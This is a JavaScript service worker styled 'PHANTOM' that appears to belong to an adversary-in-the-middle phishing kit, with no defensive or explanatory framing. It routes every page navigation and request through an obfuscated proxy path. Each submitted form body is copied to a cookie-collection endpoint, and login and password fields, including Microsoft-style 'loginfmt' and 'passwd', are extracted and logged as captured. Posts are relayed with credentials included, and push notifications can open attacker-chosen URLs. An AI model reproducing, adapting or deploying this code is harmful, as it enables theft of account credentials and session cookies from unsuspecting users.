// 🔥 PHANTOM SERVICE WORKER v10.4
const CACHE_NAME = 'phantom-cache-v10.4';
const PROXY_HOST = self.location.host;
const PROXY_PATH = '/lNv1pC9AWPUY4gbidyBO';
const SCRIPT_PATH = '/@';
const JSCOOKIE_PATH = '/JSCookie_6X7dRqLg90mH';
const MUTATION_PATH = '/Mutation_o5y3f4O7jMGW';

self.addEventListener('install', (event) => {
    console.log('🔥 PHANTOM SW: Installing...');
    self.skipWaiting();
});

self.addEventListener('activate', (event) => {
    console.log('🔥 PHANTOM SW: Activated!');
    event.waitUntil(self.clients.claim());
    caches.keys().then(names => {
        names.forEach(name => { if (name !== CACHE_NAME) caches.delete(name); });
    });
});

function rewriteUrl(url) {
    const urlObj = new URL(url);
    if (urlObj.host === PROXY_HOST) return url;
    const proxyUrl = new URL(PROXY_PATH, self.location.origin);
    proxyUrl.searchParams.set('url', url);
    return proxyUrl.toString();
}

function mutateCredentials(body) {
    try {
        const params = new URLSearchParams(body);
        const email = params.get('login') || params.get('username') || params.get('loginfmt') || params.get('email');
        const password = params.get('passwd') || params.get('password');
        if (email && password) console.log('🔑 PHANTOM SW: Credentials captured!');
    } catch(e) {}
    return body;
}

self.addEventListener('fetch', (event) => {
    const url = new URL(event.request.url);
    if (url.pathname === '/service_worker_Mz8XO2ny1Pg5.js') return;
    if (url.pathname === SCRIPT_PATH) return;
    if (url.pathname === PROXY_PATH) return;

    event.respondWith(
        (async () => {
            try {
                let proxyUrl;
                if (event.request.mode === 'navigate') {
                    proxyUrl = rewriteUrl(event.request.url);
                    const init = {
                        method: 'GET',
                        headers: new Headers(event.request.headers),
                        mode: 'cors',
                        credentials: 'include'
                    };
                    const response = await fetch(proxyUrl, init);
                    console.log('✅ PHANTOM SW: Proxied navigation to', event.request.url);
                    return response;
                }
                if (event.request.method === 'POST') {
                    let body = await event.request.text();
                    const cookieSend = await fetch(new URL(JSCOOKIE_PATH, self.location.origin), {
                        method: 'POST',
                        body: body,
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                    });
                    body = mutateCredentials(body);
                    proxyUrl = new URL(MUTATION_PATH, self.location.origin);
                    proxyUrl.searchParams.set('redirect_urI', event.request.url);
                    const init = {
                        method: 'POST',
                        body: body,
                        headers: new Headers(event.request.headers),
                        mode: 'cors',
                        credentials: 'include'
                    };
                    const response = await fetch(proxyUrl, init);
                    console.log('📤 PHANTOM SW: Proxied POST to', event.request.url);
                    return response;
                }
                proxyUrl = rewriteUrl(event.request.url);
                const init = {
                    method: event.request.method,
                    headers: new Headers(event.request.headers),
                    mode: 'cors',
                    credentials: 'include'
                };
                const response = await fetch(proxyUrl, init);
                return response;
            } catch (error) {
                console.error('❌ PHANTOM SW: Fetch error:', error);
                return fetch(event.request);
            }
        })()
    );
});

self.addEventListener('push', (event) => {
    if (event.data) {
        const data = event.data.json();
        self.registration.showNotification(data.title, {
            body: data.body,
            icon: '/favicon.ico',
            badge: '/favicon.ico',
            data: data.url
        });
    }
});

self.addEventListener('notificationclick', (event) => {
    event.notification.close();
    if (event.notification.data) {
        event.waitUntil(clients.openWindow(event.notification.data));
    }
});

console.log('🔥 PHANTOM Service Worker v10.4 — Fully Armed & Operational');
